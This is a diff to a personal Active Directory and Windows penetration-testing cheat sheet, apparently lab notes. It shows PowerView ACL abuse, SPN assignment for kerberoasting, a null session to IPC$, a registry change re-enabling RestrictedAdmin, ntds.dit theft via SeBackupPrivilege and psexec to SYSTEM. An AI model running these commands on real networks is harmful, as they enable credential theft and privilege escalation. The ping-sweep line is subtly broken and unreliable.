@@ -1,8 +1,8 @@
 # Windows
-### Active Directory
-- ACL`s
+### Active Directory ACL`s with Powerview
+
 ```
-#PowerView
+
 PS C:\htb> Import-Module .\PowerView.ps1
 PS>Find-InterestingDomainAcl
 
@@ -64,7 +64,7 @@ THEN REMOVE IT
 PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
 ```
 ```
---Assigneing an SPN to a user (GenericWrite)
+--Assigning an SPN to a user (GenericWrite)
 
  PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
 
@@ -199,6 +199,12 @@ Get-DomainTrustMapping 	Will enumerate all trusts for the current domain and any
 PS C:\htb> .\ADRecon.ps1
 ```
 
+### Establish a null session from windows
+
+```
+C:\htb> net use \\DC01\ipc$ "" /u:""
+```
+
 ### Powershell Useful
 ```
             #### Builtin AD ENUM
@@ -283,6 +289,11 @@ PS C:\htb> qwinsta
 C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
+```
+-Enable colorfull output in powershell and cmd
+
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+```
 ### Checking Defenses
 
 ```
@@ -729,7 +740,9 @@ C:\htb> sc query windefend
 for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
 
 - Powershell
-1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
+
+1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"} |Select-String ttl
+
 ```
 ### System Enum
 
@@ -912,6 +925,13 @@ DISKSHADOW> exit
 PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 
 ```
+### From Administrator to SYSTEM
+
+```
+C:\htb> psexec -i -s cmd.exe
+
+```
+
 
 ### UAC
 
